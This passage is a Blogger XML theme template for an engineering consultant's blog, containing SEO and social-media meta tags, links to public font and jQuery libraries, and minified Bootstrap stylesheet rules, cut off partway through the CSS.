          
 <?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html>
<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
  &lt;head&gt;
  <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
  <b:include data='blog' name='all-head-content'/>

  <title>
    <b:if cond='data:blog.pageType == &quot;index&quot;'>
      <data:blog.pageTitle/>
      <b:else/>
      <b:if cond='data:blog.pageType != &quot;error_page&quot;'>
        <data:blog.pageName/> - <data:blog.title/>
        <b:else/>
        ERROR 404 - <data:blog.title/> 
      </b:if>
    </b:if>
  </title>

  <!-- Description and Keywords -->
  <b:if cond='data:blog.pageType == &quot;index&quot;'>
    <meta content='GAGAN SHARMA' name='description'/>
  </b:if>
  <meta content='engineer, civil, design, best, structure, structural, analysis, consultant, nepal, pokhara, kathmandu, cheap, work, job, free' name='keywords'/>
  <b:if cond='data:blog.pageType == &quot;item&quot;'>
    <meta expr:content='data:blog.pageName' property='og:title'/>
    <meta expr:content='data:blog.canonicalUrl' property='og:url'/>
    <meta content='article' property='og:type'/>
  </b:if>
  <b:if cond='data:blog.postImageUrl'>
    <meta expr:content='data:blog.postImageUrl' property='og:image'/>
    <b:else/>
    <b:if cond='data:blog.postImageThumbnailUrl'>
      <meta expr:content='data:blog.postImageThumbnailUrl' property='og:image'/>
    </b:if></b:if>
  <b:if cond='data:blog.metaDescription != &quot;&quot;'>
    <meta expr:content='data:blog.metaDescription' name='og:description'/>
  </b:if>
  <meta expr:content='data:blog.title' property='og:site_name'/>
  <meta expr:content='data:blog.homepageUrl' name='twitter:domain'/>
  <meta expr:content='data:blog.pageName' name='twitter:title'/>
  <b:if cond='data:blog.postImageUrl'>
    <meta content='summary_large_image' name='twitter:card'/>
    <meta expr:content='data:blog.postImageUrl' name='twitter:image'/>
    <b:else/>
    <meta content='summary' name='twitter:card'/>
    <b:if cond='data:blog.postImageThumbnailUrl'>
      <meta expr:content='data:blog.postImageThumbnailUrl' name='twitter:image'/> 
    </b:if>
  </b:if>
  <meta expr:content='data:blog.pageName' name='twitter:title'/>
  <b:if cond='data:blog.metaDescription'>
    <meta expr:content='data:blog.metaDescription' name='twitter:description'/>
  </b:if>

  <!-- Links -->
  <script src='https://use.fontawesome.com/90ef38dbc3.js'/>
  <link href='https://cdn.linearicons.com/free/1.0.0/icon-font.min.css' rel='stylesheet'/>
  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300,400,400i,600,700|Playfair+Display:400,400i,700,700i,900&amp;subset=latin-ext' rel='stylesheet'/>
  <script src='//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js' type='text/javascript'/>
  <link href='https://fonts.googleapis.com/css?family=Josefin+Sans:300,400,600,700' rel='stylesheet'/>

  <!-- Links END-->

    &lt;style type=&quot;text/css&quot;&gt;&lt;!-- /* 
    <b:skin><![CDATA[/*
//////////////////////////////////////////////////////////////
//                                                         //
//  Theme Name : Isaac                                    //
//  Author : Templateclue								 //
//  Site :www.Templateclue.com                          //
//  License : Creative Commons Attribution License	   //
//  Share and Use This With Proper Credit.            //
//                                                   //
//////////////////////////////////////////////////////
*/
/*-------------------------------------------*/
/*  1. Bootstrap
/*-------------------------------------------*/
html{font-family:sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:700}dfn{font-style:italic}h1{margin:.67em 0;font-size:2em}mark{color:#000;background:#ff0}small{font-size:80%}sub,sup{position:relative;font-size:75%;line-height:0;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{height:0;-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{margin:0;font:inherit;color:inherit}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}input{line-height:normal}input[type=checkbox],input[type=radio]{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;-webkit-appearance:textfield}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{padding:.35em .625em .75em;margin:0 2px;border:1px solid silver}legend{padding:0;border:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-spacing:0;border-collapse:collapse}td,th{padding:0}/*! Source: https://github.com/h5bp/html5-boilerplate/blob/master/src/css/main.css */@media print{*,:after,:before{color:#000!important;text-shadow:none!important;background:0 0!important;-webkit-box-shadow:none!important;box-shadow:none!important}a,a:visited{text-decoration:underline}a[href]:after{content:" (" attr(href) ")"}abbr[title]:after{content:" (" attr(title) ")"}a[href^="#"]:after,a[href^="javascript:"]:after{content:""}blockquote,pre{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}img,tr{page-break-inside:avoid}img{max-width:100%!important}h2,h3,p{orphans:3;widows:3}h2,h3{page-break-after:avoid}select{background:#fff!important}.navbar{display:none}.btn>.caret,.dropup>.btn>.caret{border-top-color:#000!important}.label{border:1px solid #000}.table{border-collapse:collapse!important}.table td,.table th{background-color:#fff!important}.table-bordered td,.table-bordered th{border:1px solid #ddd!important}}@font-face{font-family:'Glyphicons Halflings';src:url(/f3a9a3b609133c3d21d6b42abbf7f43bd111df72/d50c6/fonts/glyphicons-halflings-regular.eot);src:url(/f3a9a3b609133c3d21d6b42abbf7f43bd111df72/d50c6/fonts/glyphicons-halflings-regular.eot#iefix) format('embedded-opentype'),url(/22037a3455914e5662fa51a596677bdb329e2c5c/76a8d/fonts/glyphicons-halflings-regular.woff) format('woff'),url(/aafafdc09404c4aa4447d7e898a2183def9cc1b1/33adb/fonts/glyphicons-halflings-regular.ttf) format('truetype'),url(/66b1fc67e37d01ee45ca75c4eefb144d2dbe98fa/a5916/fonts/glyphicons-halflings-regular.svg#glyphicons_halflingsregular) format('svg')}.glyphicon{position:relative;top:1px;display:inline-block;font-family:'Glyphicons Halflings';font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.glyphicon-asterisk:before{content:"\2a"}.glyphicon-plus:before{content:"\2b"}.glyphicon-eur:before,.glyphicon-euro:before{content:"\20ac"}.glyphicon-minus:before{content:"\2212"}.glyphicon-cloud:before{content:"\2601"}.glyphicon-envelope:before{content:"\2709"}.glyphicon-pencil:before{content:"\270f"}.glyphicon-glass:before{content:"\e001"}.glyphicon-music:before{content:"\e002"}.glyphicon-search:before{content:"\e003"}.glyphicon-heart:before{content:"\e005"}.glyphicon-star:before{content:"\e006"}.glyphicon-star-empty:before{content:"\e007"}.glyphicon-user:before{content:"\e008"}.glyphicon-film:before{content:"\e009"}.glyphicon-th-large:before{content:"\e010"}.glyphicon-th:before{content:"\e011"}.glyphicon-th-list:before{content:"\e012"}.glyphicon-ok:before{content:"\e013"}.glyphicon-remove:before{content:"\e014"}.glyphicon-zoom-in:before{content:"\e015"}.glyphicon-zoom-out:before{content:"\e016"}.glyphicon-off:before{content:"\e017"}.glyphicon-signal:before{content:"\e018"}.glyphicon-cog:before{content:"\e019"}.glyphicon-trash:before{content:"\e020"}.glyphicon-home:before{content:"\e021"}.glyphicon-file:before{content:"\e022"}.glyphicon-time:before{content:"\e023"}.glyphicon-road:before{content:"\e024"}.glyphicon-download-alt:before{content:"\e025"}.glyphicon-download:before{content:"\e026"}.glyphicon-upload:before{content:"\e027"}.glyphicon-inbox:before{content:"\e028"}.glyphicon-play-circle:before{content:"\e029"}.glyphicon-repeat:before{content:"\e030"}.glyphicon-refresh:before{content:"\e031"}.glyphicon-list-alt:before{content:"\e032"}.glyphicon-lock:before{content:"\e033"}.glyphicon-flag:before{content:"\e034"}.glyphicon-headphones:before{content:"\e035"}.glyphicon-volume-off:before{content:"\e036"}.glyphicon-volume-down:before{content:"\e037"}.glyphicon-volume-up:before{content:"\e038"}.glyphicon-qrcode:before{content:"\e039"}.glyphicon-barcode:before{content:"\e040"}.glyphicon-tag:before{content:"\e041"}.glyphicon-tags:before{content:"\e042"}.glyphicon-book:before{content:"\e043"}.glyphicon-bookmark:before{content:"\e044"}.glyphicon-print:before{content:"\e045"}.glyphicon-camera:before{content:"\e046"}.glyphicon-font:before{content:"\e047"}.glyphicon-bold:before{content:"\e048"}.glyphicon-italic:before{content:"\e049"}.glyphicon-text-height:before{content:"\e050"}.glyphicon-text-width:before{content:"\e051"}.glyphicon-align-left:before{content:"\e052"}.glyphicon-align-center:before{content:"\e053"}.glyphicon-align-right:before{content:"\e054"}.glyphicon-align-justify:before{content:"\e055"}.glyphicon-list:before{content:"\e056"}.glyphicon-indent-left:before{content:"\e057"}.glyphicon-indent-right:before{content:"\e058"}.glyphicon-facetime-video:before{content:"\e059"}.glyphicon-picture:before{content:"\e060"}.glyphicon-map-marker:before{content:"\e062"}.glyphicon-adjust:before{content:"\e063"}.glyphicon-tint:before{content:"\e064"}.glyphicon-edit:before{content:"\e065"}.glyphicon-share:before{content:"\e066"}.glyphicon-check:before{content:"\e067"}.glyphicon-move:before{content:"\e068"}.glyphicon-step-backward:before{content:"\e069"}.glyphicon-fast-backward:before{content:"\e070"}.glyphicon-backward:before{content:"\e071"}.glyphicon-play:before{content:"\e072"}.glyphicon-pause:before{content:"\e073"}.glyphicon-stop:before{content:"\e074"}.glyphicon-forward:before{content:"\e075"}.glyphicon-fast-forward:before{content:"\e076"}.glyphicon-step-forward:before{content:"\e077"}.glyphicon-eject:before{content:"\e078"}.glyphicon-chevron-left:before{content:"\e079"}.glyphicon-chevron-right:before{content:"\e080"}.glyphicon-plus-sign:before{content:"\e081"}.glyphicon-minus-sign:before{content:"\e082"}.glyphicon-remove-sign:before{content:"\e083"}.glyphicon-ok-sign:before{content:"\e084"}.glyphicon-question-sign:before{content:"\e085"}.glyphicon-info-sign:before{content:"\e086"}.glyphicon-screenshot:before{content:"\e087"}.glyphicon-remove-circle:before{content:"\e088"}.glyphicon-ok-circle:before{content:"\e089"}.glyphicon-ban-circle:before{content:"\e090"}.glyphicon-arrow-left:before{content:"\e091"}.glyphicon-arrow-right:before{content:"\e092"}.glyphicon-arrow-up:before{content:"\e093"}.glyphicon-arrow-down:before{content:"\e094"}.glyphicon-share-alt:before{content:"\e095"}.glyphicon-resize-full:before{content:"\e096"}.glyphicon-resize-small:before{content:"\e097"}.glyphicon-exclamation-sign:before{content:"\e101"}.glyphicon-gift:before{content:"\e102"}.glyphicon-leaf:before{content:"\e103"}.glyphicon-fire:before{content:"\e104"}.glyphicon-eye-open:before{content:"\e105"}.glyphicon-eye-close:before{content:"\e106"}.glyphicon-warning-sign:before{content:"\e107"}.glyphicon-plane:before{content:"\e108"}.glyphicon-calendar:before{content:"\e109"}.glyphicon-random:before{content:"\e110"}.glyphicon-comment:before{content:"\e111"}.glyphicon-magnet:before{content:"\e112"}.glyphicon-chevron-up:before{content:"\e113"}.glyphicon-chevron-down:before{content:"\e114"}.glyphicon-retweet:before{content:"\e115"}.glyphicon-shopping-cart:before{content:"\e116"}.glyphicon-folder-close:before{content:"\e117"}.glyphicon-folder-open:before{content:"\e118"}.glyphicon-resize-vertical:before{content:"\e119"}.glyphicon-resize-horizontal:before{content:"\e120"}.glyphicon-hdd:before{content:"\e121"}.glyphicon-bullhorn:before{content:"\e122"}.glyphicon-bell:before{content:"\e123"}.glyphicon-certificate:before{content:"\e124"}.glyphicon-thumbs-up:before{content:"\e125"}.glyphicon-thumbs-down:before{content:"\e126"}.glyphicon-hand-right:before{content:"\e127"}.glyphicon-hand-left:before{content:"\e128"}.glyphicon-hand-up:before{content:"\e129"}.glyphicon-hand-down:before{content:"\e130"}.glyphicon-circle-arrow-right:before{content:"\e131"}.glyphicon-circle-arrow-left:before{content:"\e132"}.glyphicon-circle-arrow-up:before{content:"\e133"}.glyphicon-circle-arrow-down:before{content:"\e134"}.glyphicon-globe:before{content:"\e135"}.glyphicon-wrench:before{content:"\e136"}.glyphicon-tasks:before{content:"\e137"}.glyphicon-filter:before{content:"\e138"}.glyphicon-briefcase:before{content:"\e139"}.glyphicon-fullscreen:before{content:"\e140"}.glyphicon-dashboard:before{content:"\e141"}.glyphicon-paperclip:before{content:"\e142"}.glyphicon-heart-empty:before{content:"\e143"}.glyphicon-link:before{content:"\e144"}.glyphicon-phone:before{content:"\e145"}.glyphicon-pushpin:before{content:"\e146"}.glyphicon-usd:before{content:"\e148"}.glyphicon-gbp:before{content:"\e149"}.glyphicon-sort:before{content:"\e150"}.glyphicon-sort-by-alphabet:before{content:"\e151"}.glyphicon-sort-by-alphabet-alt:before{content:"\e152"}.glyphicon-sort-by-order:before{content:"\e153"}.glyphicon-sort-by-order-alt:before{content:"\e154"}.glyphicon-sort-by-attributes:before{content:"\e155"}.glyphicon-sort-by-attributes-alt:before{content:"\e156"}.glyphicon-unchecked:before{content:"\e157"}.glyphicon-expand:before{content:"\e158"}.glyphicon-collapse-down:before{content:"\e159"}.glyphicon-collapse-up:before{content:"\e160"}.glyphicon-log-in:before{content:"\e161"}.glyphicon-flash:before{content:"\e162"}.glyphicon-log-out:before{content:"\e163"}.glyphicon-new-window:before{content:"\e164"}.glyphicon-record:before{content:"\e165"}.glyphicon-save:before{content:"\e166"}.glyphicon-open:before{content:"\e167"}.glyphicon-saved:before{content:"\e168"}.glyphicon-import:before{content:"\e169"}.glyphicon-export:before{content:"\e170"}.glyphicon-send:before{content:"\e171"}.glyphicon-floppy-disk:before{content:"\e172"}.glyphicon-floppy-saved:before{content:"\e173"}.glyphicon-floppy-remove:before{content:"\e174"}.glyphicon-floppy-save:before{content:"\e175"}.glyphicon-floppy-open:before{content:"\e176"}.glyphicon-credit-card:before{content:"\e177"}.glyphicon-transfer:before{content:"\e178"}.glyphicon-cutlery:before{content:"\e179"}.glyphicon-header:before{content:"\e180"}.glyphicon-compressed:before{content:"\e181"}.glyphicon-earphone:before{content:"\e182"}.glyphicon-phone-alt:before{content:"\e183"}.glyphicon-tower:before{content:"\e184"}.glyphicon-stats:before{content:"\e185"}.glyphicon-sd-video:before{content:"\e186"}.glyphicon-hd-video:before{content:"\e187"}.glyphicon-subtitles:before{content:"\e188"}.glyphicon-sound-stereo:before{content:"\e189"}.glyphicon-sound-dolby:before{content:"\e190"}.glyphicon-sound-5-1:before{content:"\e191"}.glyphicon-sound-6-1:before{content:"\e192"}.glyphicon-sound-7-1:before{content:"\e193"}.glyphicon-copyright-mark:before{content:"\e194"}.glyphicon-registration-mark:before{content:"\e195"}.glyphicon-cloud-download:before{content:"\e197"}.glyphicon-cloud-upload:before{content:"\e198"}.glyphicon-tree-conifer:before{content:"\e199"}.glyphicon-tree-deciduous:before{content:"\e200"}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:after,:before{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{font-size:10px;-webkit-tap-highlight-color:transparent}body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:14px;line-height:1.42857143;color:#333;background-color:#fff}button,input,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}a{color:#337ab7;text-decoration:none}a:focus,a:hover{color:#23527c;text-decoration:underline}a:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}figure{margin:0}img{vertical-align:middle}.carousel-inner>.item>a>img,.carousel-inner>.item>img,.img-responsive,.thumbnail a>img,.thumbnail>img{display:block;max-width:100%;height:auto}.img-rounded{border-radius:6px}.img-thumbnail{display:inline-block;max-width:100%;height:auto;padding:4px;line-height:1.42857143;background-color:#fff;border:1px solid #ddd;border-radius:4px;-webkit-transition:all .2s ease-in-out;-o-transition:all .2s ease-in-out;transition:all .2s ease-in-out}.img-circle{border-radius:50%}hr{margin-top:20px;margin-bottom:20px;border:0;border-top:1px solid #eee}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6{font-family:inherit;font-weight:500;line-height:1.1;color:inherit}.h1 .small,.h1 small,.h2 .small,.h2 small,.h3 .small,.h3 small,.h4 .small,.h4 small,.h5 .small,.h5 small,.h6 .small,.h6 small,h1 .small,h1 small,h2 .small,h2 small,h3 .small,h3 small,h4 .small,h4 small,h5 .small,h5 small,h6 .small,h6 small{font-weight:400;line-height:1;color:#777}.h1,.h2,.h3,h1,h2,h3{margin-top:20px;margin-bottom:10px}.h1 .small,.h1 small,.h2 .small,.h2 small,.h3 .small,.h3 small,h1 .small,h1 small,h2 .small,h2 small,h3 .small,h3 small{font-size:65%}.h4,.h5,.h6,h4,h5,h6{margin-top:10px;margin-bottom:10px}.h4 .small,.h4 small,.h5 .small,.h5 small,.h6 .small,.h6 small,h4 .small,h4 small,h5 .small,h5 small,h6 .small,h6 small{font-size:75%}.h1,h1{font-size:36px}.h2,h2{font-size:30px}.h3,h3{font-size:24px}.h4,h4{font-size:18px}.h5,h5{font-size:14px}.h6,h6{font-size:12px}p{margin:0 0 10px}.lead{margin-bottom:20px;font-size:16px;font-weight:300;line-height:1.4}@media (min-width:768px){.lead{font-size:21px}}.small,small{font-size:85%}.mark,mark{padding:.2em;background-color:#fcf8e3}.text-left{text-align:left}.text-right{text-align:right}.text-center{text-align:center}.text-justify{text-align:justify}.text-nowrap{white-space:nowrap}.text-lowercase{text-transform:lowercase}.text-uppercase{text-transform:uppercase}.text-capitalize{text-transform:capitalize}.text-muted{color:#777}.text-primary{color:#337ab7}a.text-primary:hover{color:#286090}.text-success{color:#3c763d}a.text-success:hover{color:#2b542c}.text-info{color:#31708f}a.text-info:hover{color:#245269}.text-warning{color:#8a6d3b}a.text-warning:hover{color:#66512c}.text-danger{color:#a94442}a.text-danger:hover{color:#843534}.bg-primary{color:#fff;background-color:#337ab7}a.bg-primary:hover{background-color:#286090}.bg-success{background-color:#dff0d8}a.bg-success:hover{background-color:#c1e2b3}.bg-info{background-color:#d9edf7}a.bg-info:hover{background-color:#afd9ee}.bg-warning{background-color:#fcf8e3}a.bg-warning:hover{background-color:#f7ecb5}.bg-danger{background-color:#f2dede}a.bg-danger:hover{background-color:#e4b9b9}.page-header{padding-bottom:9px;margin:40px 0 20px;border-bottom:1px solid #eee}ol,ul{margin-top:0;margin-bottom:10px}ol ol,ol ul,ul ol,ul ul{margin-bottom:0}.list-unstyled{padding-left:0;list-style:none}.list-inline{padding-left:0;margin-left:-5px;list-style:none}.list-inline>li{display:inline-block;padding-right:5px;padding-left:5px}dl{margin-top:0;margin-bottom:20px}dd,dt{line-height:1.42857143}dt{font-weight:700}dd{margin-left:0}@media (min-width:768px){.dl-horizontal dt{float:left;width:160px;overflow:hidden;clear:left;text-align:right;text-overflow:ellipsis;white-space:nowrap}.dl-horizontal dd{margin-left:180px}}abbr[data-original-title],abbr[title]{cursor:help;border-bottom:1px dotted #777}.initialism{font-size:90%;text-transform:uppercase}blockquote{padding:10px 20px;margin:0 0 20px;font-size:17.5px;border-left:5px solid #eee}blockquote ol:last-child,blockquote p:last-child,blockquote ul:last-child{margin-bottom:0}blockquote .small,blockquote footer,blockquote small{display:block;font-size:80%;line-height:1.42857143;color:#777}blockquote .small:before,blockquote footer:before,blockquote small:before{content:'\2014 \00A0'}.blockquote-reverse,blockquote.pull-right{padding-right:15px;padding-left:0;text-align:right;border-right:5px solid #eee;border-left:0}.blockquote-reverse .small:before,.blockquote-reverse footer:before,.blockquote-reverse small:before,blockquote.pull-right .small:before,blockquote.pull-right footer:before,blockquote.pull-right small:before{content:''}.blockquote-reverse .small:after,.blockquote-reverse footer:after,.blockquote-reverse small:after,blockquote.pull-right .small:after,blockquote.pull-right footer:after,blockquote.pull-right small:after{content:'\00A0 \2014'}address{margin-bottom:20px;font-style:normal;line-height:1.42857143}code,kbd,pre,samp{font-family:Menlo,Monaco,Consolas,"Courier New",monospace}code{padding:2px 4px;font-size:90%;color:#c7254e;background-color:#f9f2f4;border-radius:4px}kbd{padding:2px 4px;font-size:90%;color:#fff;background-color:#333;border-radius:3px;-webkit-box-shadow:inset 0 -1px 0 rgba(0,0,0,.25);box-shadow:inset 0 -1px 0 rgba(0,0,0,.25)}kbd kbd{padding:0;font-size:100%;font-weight:700;-webkit-box-shadow:none;box-shadow:none}pre{display:block;padding:9.5px;margin:0 0 10px;font-size:13px;line-height:1.42857143;color:#333;word-break:break-all;word-wrap:break-word;background-color:#f5f5f5;border:1px solid #ccc;border-radius:4px}pre code{padding:0;font-size:inherit;color:inherit;white-space:pre-wrap;background-color:transparent;border-radius:0}.pre-scrollable{max-height:340px;overflow-y:scroll}.container{padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}@media (min-width:768px){.container{width:750px}}@media (min-width:992px){.container{width:970px}}@media (min-width:1200px){.container{width:1170px}}.container-fluid{padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}.row{margin-right:-15px;margin-left:-15px}.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9{position:relative;min-height:1px;padding-right:15px;padding-left:15px}.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9{float:left}.col-xs-12{width:100%}.col-xs-11{width:91.66666667%}.col-xs-10{width:83.33333333%}.col-xs-9{width:75%}.col-xs-8{width:66.66666667%}.col-xs-7{width:58.33333333%}.col-xs-6{width:50%}.col-xs-5{width:41.66666667%}.col-xs-4{width:33.33333333%}.col-xs-3{width:25%}.col-xs-2{width:16.66666667%}.col-xs-1{width:8.33333333%}.col-xs-pull-12{right:100%}.col-xs-pull-11{right:91.66666667%}.col-xs-pull-10{right:83.33333333%}.col-xs-pull-9{right:75%}.col-xs-pull-8{right:66.66666667%}.col-xs-pull-7{right:58.33333333%}.col-xs-pull-6{right:50%}.col-xs-pull-5{right:41.66666667%}.col-xs-pull-4{right:33.33333333%}.col-xs-pull-3{right:25%}.col-xs-pull-2{right:16.66666667%}.col-xs-pull-1{right:8.33333333%}.col-xs-pull-0{right:auto}.col-xs-push-12{left:100%}.col-xs-push-11{left:91.66666667%}.col-xs-push-10{left:83.33333333%}.col-xs-push-9{left:75%}.col-xs-push-8{left:66.66666667%}.col-xs-push-7{left:58.33333333%}.col-xs-push-6{left:50%}.col-xs-push-5{left:41.66666667%}.col-xs-push-4{left:33.33333333%}.col-xs-push-3{left:25%}.col-xs-push-2{left:16.66666667%}.col-xs-push-1{left:8.33333333%}.col-xs-push-0{left:auto}.col-xs-offset-12{margin-left:100%}.col-xs-offset-11{margin-left:91.66666667%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-0{margin-left:0}@media (min-width:768px){.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9{float:left}.col-sm-12{width:100%}.col-sm-11{width:91.66666667%}.col-sm-10{width:83.33333333%}.col-sm-9{width:75%}.col-sm-8{width:66.66666667%}.col-sm-7{width:58.33333333%}.col-sm-6{width:50%}.col-sm-5{width:41.66666667%}.col-sm-4{width:33.33333333%}.col-sm-3{width:25%}.col-sm-2{width:16.66666667%}.col-sm-1{width:8.33333333%}.col-sm-pull-12{right:100%}.col-sm-pull-11{right:91.66666667%}.col-sm-pull-10{right:83.33333333%}.col-sm-pull-9{right:75%}.col-sm-pull-8{right:66.66666667%}.col-sm-pull-7{right:58.33333333%}.col-sm-pull-6{right:50%}.col-sm-pull-5{right:41.66666667%}.col-sm-pull-4{right:33.33333333%}.col-sm-pull-3{right:25%}.col-sm-pull-2{right:16.66666667%}.col-sm-pull-1{right:8.33333333%}.col-sm-pull-0{right:auto}.col-sm-push-12{left:100%}.col-sm-push-11{left:91.66666667%}.col-sm-push-10{left:83.33333333%}.col-sm-push-9{left:75%}.col-sm-push-8{left:66.66666667%}.col-sm-push-7{left:58.33333333%}.col-sm-push-6{left:50%}.col-sm-push-5{left:41.66666667%}.col-sm-push-4{left:33.33333333%}.col-sm-push-3{left:25%}.col-sm-push-2{left:16.66666667%}.col-sm-push-1{left:8.33333333%}.col-sm-push-0{left:auto}.col-sm-offset-12{margin-left:100%}.col-sm-offset-11{margin-left:91.66666667%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-0{margin-left:0}}@media (min-width:992px){.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9{float:left}.col-md-12{width:100%}.col-md-11{width:91.66666667%}.col-md-10{width:83.33333333%}.col-md-9{width:75%}.col-md-8{width:66.66666667%}.col-md-7{width:58.33333333%}.col-md-6{width:50%}.col-md-5{width:41.66666667%}.col-md-4{width:33.33333333%}.col-md-3{width:25%}.col-md-2{width:16.66666667%}.col-md-1{width:8.33333333%}.col-md-pull-12{right:100%}.col-md-pull-11{right:91.66666667%}.col-md-pull-10{right:83.33333333%}.col-md-pull-9{right:75%}.col-md-pull-8{right:66.66666667%}.col-md-pull-7{right:58.33333333%}.col-md-pull-6{right:50%}.col-md-pull-5{right:41.66666667%}.col-md-pull-4{right:33.33333333%}.col-md-pull-3{right:25%}.col-md-pull-2{right:16.66666667%}.col-md-pull-1{right:8.33333333%}.col-md-pull-0{right:auto}.col-md-push-12{left:100%}.col-md-push-11{left:91.66666667%}.col-md-push-10{left:83.33333333%}.col-md-push-9{left:75%}.col-md-push-8{left:66.66666667%}.col-md-push-7{left:58.33333333%}.col-md-push-6{left:50%}.col-md-push-5{left:41.66666667%}.col-md-push-4{left:33.33333333%}.col-md-push-3{left:25%}.col-md-push-2{left:16.66666667%}.col-md-push-1{left:8.33333333%}.col-md-push-0{left:auto}.col-md-offset-12{margin-left:100%}.col-md-offset-11{margin-left:91.66666667%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-9{margin-left:75%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-6{margin-left:50%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-3{margin-left:25%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-0{margin-left:0}}@media 